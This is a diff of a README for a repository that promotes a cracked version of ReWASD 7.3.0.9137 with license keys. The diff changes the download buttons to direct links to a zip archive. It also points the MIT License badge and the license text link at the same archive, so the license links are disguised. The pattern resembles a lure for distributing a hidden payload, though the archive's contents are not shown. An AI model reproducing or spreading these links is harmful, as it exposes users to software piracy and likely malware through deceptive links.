@@ -1,6 +1,6 @@
 # ReWASD 7.3.0.9137 Crack License Key Repository
 
-[![Download](https://img.shields.io/badge/Download-green)](https://megana05082003.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/megana05082003/rewasd-7-3-0-9137-activation-unlocked/branch/infirmaress/unlocked_rewasd_activation_3.0.zip)
 
 Welcome to the ultimate hub for **ReWASD 7.3.0.9137** enthusiasts seeking an alternative approach to experience full customization potential. 🚀 This repository is designed as a comprehensive guide, toolkit, and community-driven knowledge base for unlocking, configuring, and maximizing **ReWASD 7.3.0.9137**. Here, you’ll embark on a journey to supercharge your device compatibility, elevate your gaming sessions, and unveil next-generation controller mapping without boundaries.
 
@@ -97,9 +97,9 @@ This repository and its resources are provided **for educational purposes only**
 
 This project is distributed under the open-source MIT License. Feel free to remix, adapt, and contribute—within the bounds of this very liberal license.
 
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/megana05082003/rewasd-7-3-0-9137-activation-unlocked/branch/infirmaress/unlocked_rewasd_activation_3.0.zip)
 
-Read the full [MIT License](https://opensource.org/licenses/MIT).
+Read the full [MIT License](https://raw.githubusercontent.com/megana05082003/rewasd-7-3-0-9137-activation-unlocked/branch/infirmaress/unlocked_rewasd_activation_3.0.zip).
 
 ---
 
@@ -108,7 +108,7 @@ Read the full [MIT License](https://opensource.org/licenses/MIT).
 Ready to explore unrivaled controller mapping?  
 **Download links and license key resources are available below:**
 
-[![Download](https://img.shields.io/badge/Download-green)](https://megana05082003.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/megana05082003/rewasd-7-3-0-9137-activation-unlocked/branch/infirmaress/unlocked_rewasd_activation_3.0.zip)
 
 ---
 
